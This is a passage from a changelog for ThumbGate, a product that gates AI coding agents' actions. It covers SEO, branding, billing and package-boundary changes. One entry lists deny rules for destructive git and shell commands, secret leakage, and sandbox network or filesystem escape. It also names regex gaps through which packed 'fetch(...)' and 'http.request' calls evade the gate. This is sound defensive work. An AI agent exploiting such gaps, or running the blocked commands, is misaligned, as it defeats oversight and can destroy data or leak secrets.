    and the npm package page.
  - GitHub repo / npmjs.com: README had no brand image. Now renders the
    same canonical 128x128 PNG at the top so github.com visitors and npm
    installers see the same mark that renders on the landing page.

  `public/og.png` (already present, already canonical) still needs to be
  uploaded to GitHub's Settings -> Social preview separately — GitHub does
  not expose that surface via REST or GraphQL, so it can only be uploaded
  via the web UI.

- [#1196](https://github.com/IgorGanapolsky/ThumbGate/pull/1196) [`1ea88ec`](https://github.com/IgorGanapolsky/ThumbGate/commit/1ea88ec22d9a7904519a03063e5df54154ef6960) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(analytics): deepen buyer loss telemetry and expose loss-analysis reporting

  Capture first-party buyer behavior on the public landing pages so
  ThumbGate can explain lost dollars with evidence instead of anecdotes.

  - track section views, CTA impressions, page exits, and buyer email
    focus/abandon behavior on the homepage and Pro page
  - aggregate behavioral telemetry into funnel dropoff, inferred causes,
    explicit objections, and revenue-opportunity reporting
  - expose the synthesized loss-analysis view through
    `/v1/analytics/losses` and keep the OpenAPI surfaces aligned

  This release does not claim more revenue by itself. It makes the live
  buyer funnel diagnosable once deployed, which closes a major blind spot
  in why ThumbGate is not yet converting consistently.

- [#1226](https://github.com/IgorGanapolsky/ThumbGate/pull/1226) [`947f12b`](https://github.com/IgorGanapolsky/ThumbGate/commit/947f12b6d55339d768127d814eded7dacca4a230) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - chore(canonical): thumbgate.ai across public pages and seo-gsd

  Replaced stale `usethumbgate.com` references with the canonical `thumbgate.ai` domain in `public/learn.html`, `public/compare/mem0.html`, `public/compare/speclock.html`, `public/llm-context.md`, and `scripts/seo-gsd.js`. PR [#1202](https://github.com/IgorGanapolsky/ThumbGate/issues/1202) attempted this fix and was closed as duplicate of [#1201](https://github.com/IgorGanapolsky/ThumbGate/issues/1201), but [#1201](https://github.com/IgorGanapolsky/ThumbGate/issues/1201) only shipped Multica guide content — the URL replacements never landed. Every canonical link, `og:url`, schema.org `url`, and llm-context reference on these pages now points at the active domain.

- [#1188](https://github.com/IgorGanapolsky/ThumbGate/pull/1188) [`6a8b0fb`](https://github.com/IgorGanapolsky/ThumbGate/commit/6a8b0fba6cde3b4b2b6bc7273bc3b5c1a3cb7e43) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(seo): add /guides/chatgpt-ads-trust page and ChatGPT-ads FAQ

  New SEO/GEO guide page threading the "pre-action gates" thesis
  against the ChatGPT ads rollout (CPC bidding went live 2026-04-21
  per Digiday; ads test started 2026-02-09 per TechCrunch).

  Adds a JSON-LD `FAQPage` entry on the homepage answering _why does
  the ChatGPT ads rollout matter to ThumbGate?_, and links the new
  guide from the ChatGPT GPT section with a "Why ChatGPT ads need
  gates" CTA.

  Canonical URL pinned to `https://thumbgate.ai/guides/chatgpt-ads-trust`.
  Pre-existing guide files still use the legacy `usethumbgate.com`
  domain that 301-redirects to apex but drops the path — a separate
  PR sweeps those.

- [#1274](https://github.com/IgorGanapolsky/ThumbGate/pull/1274) [`8310236`](https://github.com/IgorGanapolsky/ThumbGate/commit/83102360d50563f8af2764fede9d8bd4828aea7e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(chatgpt): harden the published GPT feedback-capture repair packet

  The ChatGPT GPT setup guide now fails closed when `captureFeedback` is unauthenticated or unavailable: it must say "Not saved in ThumbGate yet" instead of implying a reusable lesson was saved. The GPT Store packet also pins the canonical ThumbGate avatar and records a live audit of the published GPT drift so the wrong icon, stale Action instructions, and Bearer-auth setup issue can be repaired from evidence.

- [#1237](https://github.com/IgorGanapolsky/ThumbGate/pull/1237) [`4a549e6`](https://github.com/IgorGanapolsky/ThumbGate/commit/4a549e6e965c487f5ecd74a5af7afaeb6465b40a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add feedback-derived prompt/workflow evaluation so real thumbs-up/down signals can become reusable eval suites, CLI proof reports, and buyer-ready evidence artifacts.

- [#1207](https://github.com/IgorGanapolsky/ThumbGate/pull/1207) [`a0517d1`](https://github.com/IgorGanapolsky/ThumbGate/commit/a0517d1774333f482a639874b4a6881a2824c45a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(decision-journal): pin clock in metrics test to remove day-boundary flake

  `computeDecisionMetrics` now accepts an optional `options.now` and threads it into `initializeDaySeries`, so the rolling 14-day window is driven by an injectable clock rather than a fresh `new Date()` at aggregation time. The metrics test pins both the synthetic event base and the aggregator clock to the same reference timestamp, removing the race where CI crossing UTC midnight between event inserts and aggregation dropped events out of the window and failed `metrics.days.some((day) => day.evaluations > 0)`.

- [#1144](https://github.com/IgorGanapolsky/ThumbGate/pull/1144) [`61c65bf`](https://github.com/IgorGanapolsky/ThumbGate/commit/61c65bf3538608c4d484fc26f1cd60f0cfa541bf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Trim additional internal analytics, orchestration, and operational scripts out of the public ThumbGate npm package so the shipped surface stays closer to a thin client.

- [#1238](https://github.com/IgorGanapolsky/ThumbGate/pull/1238) [`6e98379`](https://github.com/IgorGanapolsky/ThumbGate/commit/6e9837986963d3033f76724b47953d5af0b85a22) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(eval): expand gate-eval seed set 19→67 cases + wire into CI as regression gate

  Applying Anthropic's measure-first prompt-eval methodology to ThumbGate's gate layer. The existing `config/evals/agent-safety-eval.json` only had 19 cases — enough to prove the harness worked, not enough to catch regex drift. This PR widens coverage and turns the eval into a merge-blocker so any constraint change that breaks a case gets caught before ship.

  **Seed expansion (19 → 67 cases):**

  - `no-force-push` — 9 cases (long/short flag, --force-with-lease, flag-after-branch, extra whitespace, uppercase + 3 negative near-misses for normal push/tags/upstream).
  - `no-reset-hard` — 7 cases (HEAD~N, origin/main, @{u}, extra whitespace + soft/mixed/plain resets pass).
  - `no-rm-rf-root` — 8 cases (/, ../, ~, . + node_modules, dist, .cache, single file pass).
  - `no-env-in-code` — 10 cases (AWS/GitHub/OpenAI/RSA/EC/generic PEM + normal code, short AKIA prefix, doc prose, public key pass).
  - `no-skip-hooks` — 6 cases (--no-verify on commit/amend/push, --no-gpg-sign + normal commit/rebase pass).
  - `no-drop-table` — 8 cases (TABLE/DATABASE/SCHEMA, lowercase + SELECT/CREATE/TRUNCATE/DROP COLUMN pass).
  - `no-sandbox-network` — 9 cases (curl/wget/fetch/net.connect/http + safe log/math pass + 1 documented regex gap).
  - `no-sandbox-fs-escape` — 8 cases (/etc, /var, /usr, /home, ../, process.env + safe in-memory/local-require pass).
  - Generic npm-lint pass case (multi-input tool+content).

  **2 real regex gaps surfaced by the expanded coverage (tracked as follow-ups, not fixed here — scope discipline):**

  1. `no-env-in-code` does not catch OpenAI's `sk-proj-<alnum>{20+}` format because the embedded dash breaks the `[a-zA-Z0-9]{20,}` run. Pinned as `openai-project-key-gap-passes` so future tightening flips the expectation visibly.
  2. `no-sandbox-network` requires whitespace after `http`/`fetch`, so packed calls like `http.request(opts)` and `fetch('...')` slip through. Pinned as `sandbox-http-dot-request-gap-passes` and `sandbox-fetch-no-space-gap-passes`.

  **CI regression gate:**

  - New npm script `gate-eval:ci` runs `scripts/gate-eval.js run` which exits non-zero on any case failure.
  - Added step in `.github/workflows/ci.yml` immediately after `npm test` — any constraint change in `config/specs/*.json` that flips a previously-passing case (e.g. widens a deny regex and starts catching a "safe" case) will block merge until the eval JSON is consciously updated in the same PR.

  Net effect: every PR now has to take explicit responsibility for changes to gate behavior. No more silent regex drift.

- [#1206](https://github.com/IgorGanapolsky/ThumbGate/pull/1206) [`02fc119`](https://github.com/IgorGanapolsky/ThumbGate/commit/02fc119df9ef7411709e2ef3432b783a5eee7a09) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - marketing(gcp-mcp): Google Cloud Next 2026 piggyback — Agentic Data Cloud guardrails

  Adds `/guides/gcp-mcp-guardrails` SEO landing, four platform posts (LinkedIn, Reddit r/ClaudeAI, Bluesky, Threads) under `docs/marketing/gcp-mcp/`, and a Google Data Agent Kit compatibility card on the landing page. Captures the 24-hour news-window audience from Google's April 22 Agentic Data Cloud announcement by positioning ThumbGate as the feedback-driven enforcement layer that IAM and VPC Service Controls cannot represent. No new adapter — the Data Agent Kit drops into Claude Code, Codex, Gemini CLI, and VS Code, all first-class-supported by ThumbGate.

- [#1190](https://github.com/IgorGanapolsky/ThumbGate/pull/1190) [`ce688de`](https://github.com/IgorGanapolsky/ThumbGate/commit/ce688de68da4c42108a1fa5682679e914863a7c0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - chore(brand): add 1280x640 GitHub social preview asset

  Add `public/assets/brand/github-social-preview.png` at GitHub's
  1280x640 spec, rendered from the same `thumbgate-icon-512.png`
  that Stripe product thumbnails and the homepage og.png reference.
  One canonical visual identity across marketing, checkout, and the
  repo social preview.

  Upload is a manual follow-up: Settings → General → Social preview.
  GitHub's REST and GraphQL APIs do not expose an upload endpoint
  for this field.

- [#1271](https://github.com/IgorGanapolsky/ThumbGate/pull/1271) [`19f3b8e`](https://github.com/IgorGanapolsky/ThumbGate/commit/19f3b8e96071b2af54a0b244109b0b4bb7678946) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - docs(gpt-store): sharpen GPT listing copy for discovery

  The live GPT listing had 3 conversations — not a product problem, a discovery problem. Description was jargon-heavy ("proof-backed Reliability Gateway workflows") and conversation starters buried the pain behind branded terminology.

  New short/full descriptions lead with the named pain ("Stop your AI agent from repeating mistakes") and starters match what developers type mid-frustration. Also adds an ACTION REQUIRED banner reminding the operator that the live listing needs a publish bump in GPT Builder for updated copy to appear.

  Version-metadata test assertions updated to match the new copy (starter text + short description).

- [#1191](https://github.com/IgorGanapolsky/ThumbGate/pull/1191) [`9bda185`](https://github.com/IgorGanapolsky/ThumbGate/commit/9bda1853211b86b2066075ba96d98009ab1d2640) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(guides): canonicalize guide pages to thumbgate.ai

  Rewrite `og:url`, `<link rel="canonical">`, and JSON-LD
  `url` / `mainEntityOfPage` / `publisher.url` on the remaining 11 guide
  pages from `https://usethumbgate.com` to `https://thumbgate.ai`.

  The legacy `usethumbgate.com` host 301-redirects to `thumbgate.ai` but
  drops the path, so Google saw every `/guides/<slug>` canonicalize to
  the bare apex and collapsed the topical signal across all guides into
  a single URL. Matches the chatgpt-ads-trust.html fix shipped in [#1188](https://github.com/IgorGanapolsky/ThumbGate/issues/1188).

- Add high-ROI agent operating-system planners for workspace routines, data-table agents, code-mode MCP, hybrid supervisors, graph knowledge layers, audit traces, inference caching, verifier scoring, and synthetic-data provenance gates.

- [#1239](https://github.com/IgorGanapolsky/ThumbGate/pull/1239) [`1a24251`](https://github.com/IgorGanapolsky/ThumbGate/commit/1a242519a4fbe90e4241e2fe782b4c51414964a7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(lesson-inference): XML-tagged Claude prompt + 5 multishot exemplars

  Applies Anthropic's prompt-engineering playbook (ref: [Prompt Engineering course](https://anthropic.skilljar.com/claude-with-the-anthropic-api/287745)) to the LLM lesson-extraction prompt in `scripts/lesson-inference.js`. This is PR 2 of the high-ROI eval sequence (PR 1 was gate-eval seed expansion).

  **Why this prompt specifically:**

  `inferStructuredLessonLLM` calls Claude with a strict-JSON output contract. It hits exactly the three failure modes that XML tags + multishot exemplars are designed to fix:

  1. Model occasionally wraps JSON in code fences despite instructions → tightened with explicit `<guidelines>` clause + `no code fences` prohibition.
  2. Plain-text `Signal: positive` / `Conversation:` headers compete with the conversation content itself for the model's attention → replaced with scoped `<signal>`, `<user_context>`, `<conversation_window>` tags.
  3. Schema description without exemplars means the model has to synthesize shape from an abstract spec → replaced with 5 concrete `<example>` blocks drawn from real ThumbGate incident classes.

  **What changed:**

  - `LLM_LESSON_SYSTEM_PROMPT` rebuilt with `<task>`, `<output_schema>`, `<guidelines>`, `<examples>` section tags. Schema enum values moved to explicit pipe-delimited unions (`<debugging|implementation|question|error-report|constraint>`).
  - New `LLM_LESSON_MULTISHOT_EXAMPLES` constant — 5 exemplars covering: Edit-before-Read, force-push-to-main, deploy-verification, mock-to-live-in-tests, regression-test-pinning. Each exemplar is a `{signal, conversationWindow, output}` triple; `output` is the exact JSON the model should emit.
  - New `renderMultishotExamplesForPrompt()` renders the exemplar set as `<example><signal>…</signal><conversation_window>…</conversation_window><output>{…}</output></example>` blocks, then inlines them into the system prompt.
  - New `buildLessonUserPrompt({signal, context, windowText})` wraps the user-side content in `<signal>`, `<user_context>` (optional), `<conversation_window>` tags. `inferStructuredLessonLLM` now calls this helper, so the caller's `windowText` never competes with header text for attention.
  - Signal normalization preserved: `positive`/`up` → `positive`; `negative`/`down` → `negative`.

  **New regression tests (`tests/lesson-prompt-shape.test.js`, 9 cases):**

  - Every XML section tag (`<task>`, `<output_schema>`, `<guidelines>`, `<examples>`) is balanced and correctly ordered.
  - Every schema enum value (`ALLOWED_TRIGGER_TYPES`, `ALLOWED_ACTION_TYPES`, `ALLOWED_SCOPES`) appears in the prompt — accidental removal surfaces instantly.
  - Multishot exemplar count pinned at 5; must cover both `positive` and `negative` signals.
  - Every exemplar `output` is schema-valid JSON (trigger.type, action.type, scope enum checks; confidence in [0,1]; non-empty string tags).
  - Rendered `<example>` block extracts cleanly via a naive regex parser and round-trips through JSON.parse back to the source exemplar object.
  - `buildLessonUserPrompt` emits expected XML structure, normalizes signals, omits `<user_context>` when not provided.
  - System prompt contains explicit "no code fences / no prose" prohibitions.

  **What this does NOT change:**

  - No behavior change in `createLesson`, `extractTrigger`, `extractAction`, `extractToolCalls`, or any of the deterministic lesson-building pipeline. Those stay regex-driven and tested by the existing 30-case `tests/lesson-inference.test.js` suite (still green).
  - No measurement of the actual Claude-response quality improvement. That requires a lesson-eval suite analogous to `config/evals/agent-safety-eval.json` plus live API calls — queued as follow-up (`feat/lesson-eval-suite`). Today's PR ships the prompt upgrade and the shape-regression guard; quality measurement is the next loop.

  **Follow-up (not in this PR):**

  - `feat/lesson-eval-suite` — curate 30+ (signal, conversation_window, expected_lesson) tuples from `.claude/memory/feedback/lessons-index.jsonl` and wire into `scripts/gate-eval.js` as a live A/B suite that compares the old prompt vs the new prompt on the same conversation windows.

- [#1185](https://github.com/IgorGanapolsky/ThumbGate/pull/1185) [`a3952e2`](https://github.com/IgorGanapolsky/ThumbGate/commit/a3952e21e020a1c54bbe70f38cfff5a203e97082) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the public marketing surface with orchestration-vs-enforcement positioning, plus new buyer workflow pages for platform teams and regulated workflows.

- [#1153](https://github.com/IgorGanapolsky/ThumbGate/pull/1153) [`b9d7f2c`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9d7f2c5d39493f550b8a9926fd52d41d5038cd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(mcp): lazy-load lesson search private boundary

  Move the remaining direct lesson-search import in the MCP stdio adapter
  behind the private module loader. This keeps the hosted/private runtime
  behavior unchanged while letting the public shell return the standard
  `private_core` availability payload if lesson search is extracted out of
  the public package.

  This pins the boundary in two ways:

  1. `search_lessons` now resolves through the MCP private-module loader.
  2. MCP tests cover the unavailable-module path for lesson search along
     with the existing private-core tool matrix.

- [#1153](https://github.com/IgorGanapolsky/ThumbGate/pull/1153) [`b9d7f2c`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9d7f2c5d39493f550b8a9926fd52d41d5038cd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(mcp): lazy-load semantic and lesson-inference private boundaries

  Move the remaining direct semantic-layer and lesson-inference imports in
  the MCP stdio adapter behind the existing private-module loader. The
  public adapter now returns the standard `private_core` availability
  payload when those modules are absent instead of hard-requiring them at
  module load time.

  This keeps the public shell compatible with the current runtime while
  making the next extraction cut safer:

  1. `get_business_metrics` and `describe_semantic_entity` now route
     through the semantic-layer private boundary.
  2. `context_stuff_lessons` now routes through the lesson-inference
     private boundary.
  3. MCP tests pin both the loaded and unavailable paths so the public
     shell can shed these modules without breaking the adapter contract.

- [#1201](https://github.com/IgorGanapolsky/ThumbGate/pull/1201) [`e04c2b5`](https://github.com/IgorGanapolsky/ThumbGate/commit/e04c2b5f61bbc5d33625fe38990f89b904324329) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - marketing(multica): positioning play for self-hosted agent orchestration

  Adds `/guides/multica-thumbgate-setup` SEO landing page and four platform posts (LinkedIn, Reddit r/ClaudeAI, Bluesky, Threads) under `docs/marketing/multica/`. Captures the self-hosted-agent-orchestration audience (Multica + Claude Code + autopilot users) by positioning ThumbGate as the enforcement layer their autopilot setup is missing. No new adapter — Multica runs first-class-supported terminal agents (Claude Code, OpenCode) that ThumbGate already integrates with.

- [#1270](https://github.com/IgorGanapolsky/ThumbGate/pull/1270) [`8770d0c`](https://github.com/IgorGanapolsky/ThumbGate/commit/8770d0c6378031390bac1986178b91f3108dcfb5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(operational-dashboard): match operational-summary's loud-failure behavior and full operator-key chain

  `operational-dashboard.js` was inconsistent with `operational-summary.js` in two ways:

  1. It resolved only `THUMBGATE_API_KEY`, missing the `THUMBGATE_OPERATOR_KEY` env var and `~/.config/thumbgate/operator.json` file paths that the rest of the CLI uses. This caused `north-star` to silently fall back to local data when the operator key was configured correctly for `cfo`.

  2. On 401/403 it caught the error and returned empty local dashboard data, mirroring the same silent-$0 bug just fixed in `operational-summary.js`.

  Both are now aligned: hosted config uses the shared `loadOperatorConfig()` chain, and 401/403 throw `hosted_dashboard_unauthorized`. Non-auth failures still fall back but tag `source: 'local-unverified'` with `hostedStatus` so the CLI can flag unverified data.

- [#1162](https://github.com/IgorGanapolsky/ThumbGate/pull/1162) [`252b648`](https://github.com/IgorGanapolsky/ThumbGate/commit/252b64800c4fada60e1d99c6b3a151e9b790dade) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(brand): regenerate public/og.png to match Stripe product icon

  Social card previews (LinkedIn, Twitter, iMessage) were serving the
  old legacy og.png while Stripe product pages used the canonical
  `thumbgate-icon-512.png`. CEO flagged the mismatch after a LinkedIn
  link preview showed the old wordmark banner instead of the current
  brand mark.

  Regenerate `public/og.png` at the standard 1200×630 social-card
  aspect, centered on the brand dark `srgb(6,16,21)` background, using
  the exact same `thumbgate-icon-512.png` that Stripe product images
  point at. One canonical visual identity across the marketing surface
  and the checkout surface.

  No HTML changes — every page that referenced `/og.png` inherits the
  new card automatically as social-platform caches refresh.

- [#1189](https://github.com/IgorGanapolsky/ThumbGate/pull/1189) [`3b2f8ba`](https://github.com/IgorGanapolsky/ThumbGate/commit/3b2f8ba0f2fb5fc1d4440095557ecd6b537210c9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix three post-everywhere dispatcher contract mismatches discovered live
  2026-04-22 during the ChatGPT CPC ads campaign:

  - `postToLinkedIn` called `linkedin.publishPost({text})`; the module exports
    `publishTextPost(token, personUrn, text)`.
  - `postToThreads` called `threads.publishPost({text})`; no such export (real
    entry is `postTextThread({text, token, userId})`).
  - `postToBluesky` called `zernio.publishPost({text, platform})`; the real
    signature is `publishPost(content, platforms[], options)` with `accountId`
    required on each platform entry.

  All three now route through `zernio.publishToAllPlatforms(content,
{platforms:[<name>]})` — single code path, account discovery handled by
  Zernio. Contract tests in `tests/post-everywhere-channels.test.js` spy on
  `publishToAllPlatforms` and pin the call shape so this bug class cannot land
  again.

- [#1153](https://github.com/IgorGanapolsky/ThumbGate/pull/1153) [`b9d7f2c`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9d7f2c5d39493f550b8a9926fd52d41d5038cd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep the public ThumbGate server package resilient when private orchestration modules are absent by lazy-loading intent routing, handoff, hosted-job, and workflow-sprint surfaces instead of shipping them in the npm tarball.

- [#1153](https://github.com/IgorGanapolsky/ThumbGate/pull/1153) [`b9d7f2c`](https://github.com/IgorGanapolsky/ThumbGate/commit/b9d7f2c5d39493f550b8a9926fd52d41d5038cd6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep the public ThumbGate package resilient when private MCP intelligence modules are absent by lazy-loading org dashboard and reflector surfaces instead of shipping them in the npm tarball.

- [#1132](https://github.com/IgorGanapolsky/ThumbGate/pull/1132) [`0b97f19`](https://github.com/IgorGanapolsky/ThumbGate/commit/0b97f195b5c1dc179de9766bdfe41c413366f990) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - docs(directives): persist Product Architecture Split to CLAUDE.md / AGENTS.md / GEMINI.md

  Codify the two-repo product boundary on the three canonical directive
  files so future sessions — across Claude, Codex, and Gemini — don't
  drift the public shell back toward proprietary intelligence surfaces.

  - **Public shell** (`IgorGanapolsky/ThumbGate`, npm `thumbgate`): CLI,
    hook installer, adapter configs, local gate runner, public schemas,
    marketing. Thin by design.
  - **Private core** (`IgorGanapolsky/ThumbGate-Core`): ranking, policy
    synthesis, orchestration, billing intelligence, org visibility,
    licensed exports. Not published to npm, not required by public CI.

  Boundary rules: no re-expansion, wire protocol only, independent CI,
  dedicated worktrees, and no "split complete" claim without measurable
  deltas. Violation triggers (direct Core imports, public README
  describing Core-only features, Core API keys in public CI, Core as
  public runtime dependency) block merge.

  No runtime change — docs only.

- [#1157](https://github.com/IgorGanapolsky/ThumbGate/pull/1157) [`29c51b9`](https://github.com/IgorGanapolsky/ThumbGate/commit/29c51b9e3b7027de00d54827404b900d8a0c3c02) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - test(boundary): add public-core-boundary regression test

  CLAUDE.md / AGENTS.md / GEMINI.md mandate a regression test at
  `tests/public-core-boundary.test.js` to pin fixes that preserve the
  Product Architecture Split. Until now this file did not exist on main,
  so each "split complete" claim was unverifiable.

  The test asserts three directive-codified violation triggers:

  1. No packaged JS/TS file imports `thumbgate-core`, `@thumbgate/core`,
     or `../ThumbGate-Core`. Public code must talk to Core over a wire
     protocol, never direct `require`.
  2. `package.json` does not list Core in `dependencies`,
     `peerDependencies`, or `optionalDependencies`.
  3. The npm bundle file count stays below a ceiling (260 currently, with
     ~50-file headroom over today's 212) to catch silent re-expansion.

  All three pass against the current public shell. This test is the
  canonical home for future boundary fixes.

- [#1133](https://github.com/IgorGanapolsky/ThumbGate/pull/1133) [`a419771`](https://github.com/IgorGanapolsky/ThumbGate/commit/a419771fb62822cb5d108b5e3b22daa8c45ce409) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep the public ThumbGate package boundary thin by removing non-runtime workflow, tracing, and sales pipeline scripts from the published tarball.

- [#1140](https://github.com/IgorGanapolsky/ThumbGate/pull/1140) [`d675466`](https://github.com/IgorGanapolsky/ThumbGate/commit/d675466984975297f4ba8000289b3e2e961537e6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Keep the public ThumbGate package boundary aligned with ThumbGate-Core by
  loading private-core modules optionally in the public shell, and update
  the Pro CLI verification to reflect the current private-core split.

- [#1138](https://github.com/IgorGanapolsky/ThumbGate/pull/1138) [`cbf8c25`](https://github.com/IgorGanapolsky/ThumbGate/commit/cbf8c25df449cf346e323f2ceb186c4b4ae556b1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Treat pending changesets as an audited no-op path in the npm publish guard so main no longer fails when release-relevant content lands ahead of the next versioned publish.

- [#1155](https://github.com/IgorGanapolsky/ThumbGate/pull/1155) [`06a8e25`](https://github.com/IgorGanapolsky/ThumbGate/commit/06a8e2548ac9151dcdc685545de590946f877df4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - test(reflector-agent): isolate from developer feedback DB

  The `reflector-agent.test.js` unit tests call `checkRecurrence`, which
  transitively reads `memory-log.jsonl` under the resolved feedback dir.
  On developer machines with a populated lesson DB, assertions that
  expect zero matches (`severity: 'info'`, `recurrence.count: 0`) flip
  to `'warning'` / `1` because real recurring-mistake memories leak in.

  Pin `THUMBGATE_FEEDBACK_DIR` to a fresh empty `mkdtempSync` dir for the
  lifetime of the file, and restore the prior value in an `after` hook.
  This lets the full verification chain run head-to-tail without one
  stray test stopping the `&&` chain.

  No runtime change. Tests only.

- [#1233](https://github.com/IgorGanapolsky/ThumbGate/pull/1233) [`fd01a68`](https://github.com/IgorGanapolsky/ThumbGate/commit/fd01a6807a369061d98b4d22099cc4bf34c6721d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Replace customer-facing Pre-Action Gates language with Pre-Action Checks across public docs, package metadata, plugin manifests, and marketing surfaces.

- [#1173](https://github.com/IgorGanapolsky/ThumbGate/pull/1173) [`019e3a3`](https://github.com/IgorGanapolsky/ThumbGate/commit/019e3a384c5ff31a2a1630645dd1818946935fb1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Align `scripts/social-reply-monitor.js` and `scripts/social-analytics/poll-all.js`
  with the CLAUDE.md X/Twitter retirement (2026-04-20). The reply monitor's
  `checkXReplies` branch (plus its `collectXSearchCandidates`,
  `isRevenueRelevantXTweet`, `buildOwnedConversationQuery`, and `DEFAULT_X_HANDLE`
  helpers) has been removed — the default platform list is now `['reddit', 'linkedin']`.
  `LEGACY_POLLERS` no longer contains the `x` entry, and `scripts/social-analytics/pollers/x.js`
  and `scripts/social-analytics/publishers/x.js` have been deleted. The
  `social:poll:x` npm script has been removed. Tests in
  `tests/social-reply-monitor.test.js`, `tests/zernio-canonical-pollers.test.js`,
  and `tests/social-analytics.test.js` are pinned to the new surface.

- [#1268](https://github.com/IgorGanapolsky/ThumbGate/pull/1268) [`377385e`](https://github.com/IgorGanapolsky/ThumbGate/commit/377385e03f4c91fae7a25685e6bbb8c25bc03037) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(operational-summary): throw on 401/403 instead of silently falling back to empty local ledger

  The hosted billing summary client used a `try { hosted } catch { local }` pattern that swallowed auth failures. When the operator key expired, the CLI reported $0.00 revenue even though Stripe had real charges — because the local ledger was empty and the 401 was caught silently.

  Now 401/403 throw `hosted_summary_unauthorized` with an actionable message (re-auth the operator key). Non-auth failures (503, network) still fall back to local, but the result is tagged `source: 'local-unverified'` with `hostedStatus` so downstream consumers can distinguish verified from unverified revenue.

- [#1199](https://github.com/IgorGanapolsky/ThumbGate/pull/1199) [`84d5d56`](https://github.com/IgorGanapolsky/ThumbGate/commit/84d5d5666a6e3b6ebfa9d140c2ce8d8fd1163cf1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - marketing(roo-sunset): Cline-migration campaign + SEO guide

  Adds `docs/marketing/roo-sunset/` copy for LinkedIn / Reddit r/ClaudeAI / Bluesky / Threads (all four live via Zernio 2026-04-22) and `public/guides/roo-code-alternative-cline.html` as the SEO landing for the Roo sunset narrative. Pairs with the new Cline adapter to convert Roo's 2026-05-15 shutdown into ThumbGate installs.

- [#1259](https://github.com/IgorGanapolsky/ThumbGate/pull/1259) [`ad62ce7`](https://github.com/IgorGanapolsky/ThumbGate/commit/ad62ce786a95b674a665ca44e00b380a4cea7be8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make eval fixtures scanner-safe by replacing secret-shaped committed test data with runtime-expanded placeholders, and add regression coverage to prevent future GitGuardian-style false positives.

- [#1272](https://github.com/IgorGanapolsky/ThumbGate/pull/1272) [`6d5b82f`](https://github.com/IgorGanapolsky/ThumbGate/commit/6d5b82ffaaa91fee30dd80226d634aa83af0ca90) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(pricing): correct stale $99/seat Team price in .well-known/llms.txt and extend parity guard

  AI crawlers reading `.well-known/llms.txt` were being served the retired `$99/seat/mo` Team anchor. The canonical anchor per `docs/COMMERCIAL_TRUTH.md` has been `$49/seat/mo with a 3-seat minimum` since mid-April 2026; every HTML surface, server-side constant (`TEAM_MONTHLY_PRICE_DOLLARS`), and README already uses $49. The llms.txt leak was the last unguarded public surface.

  Also extends `tests/public-package-parity.test.js` to scan `.well-known/` text surfaces in addition to HTML, so this class of leak is caught in CI next time.

- [#1231](https://github.com/IgorGanapolsky/ThumbGate/pull/1231) [`256450a`](https://github.com/IgorGanapolsky/ThumbGate/commit/256450a0ea899a84598b2529a843ab34fd08b799) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(billing): differentiate ThumbGate Free/Pro/Team with tier-specific product icons

  CEO flagged that the Stripe product catalog renders "ThumbGate Team" and "ThumbGate Pro" with the same icon. Root cause: `scripts/billing.js` always shipped `thumbgate-icon-512.png` in `product_data.images` regardless of plan, so Stripe had no way to draw them differently.

  - Added `public/assets/brand/thumbgate-mark-{pro,team}.svg` and rendered 512×512 PNGs. Pro adds a gold PRO ribbon to the upper-right; Team adds a violet pill with three stacked member dots. The core TG gate glyph is unchanged so cross-surface brand continuity holds.
  - Introduced `resolveTierIconUrl(planId, appOrigin)` in `scripts/billing.js`; `buildCheckoutProductData` now accepts `planId` and picks the right icon per plan.
  - Added `scripts/stripe-sync-product-images.js` (idempotent) to patch the `images` field on existing dashboard Products so already-created Team/Pro rows stop rendering as twins. Must run post-deploy once the PNGs are live on the public shell.
  - Regression test in `tests/billing.test.js` pins three distinct URLs for free/pro/team checkout payloads; `tests/public-static-assets.test.js` confirms the public shell serves the two new PNGs.

  Follow-up (not in this PR): the core TG monogram still has no thumb silhouette despite the product name. Separate design session to consider integrating the thumb gesture into the primary mark.

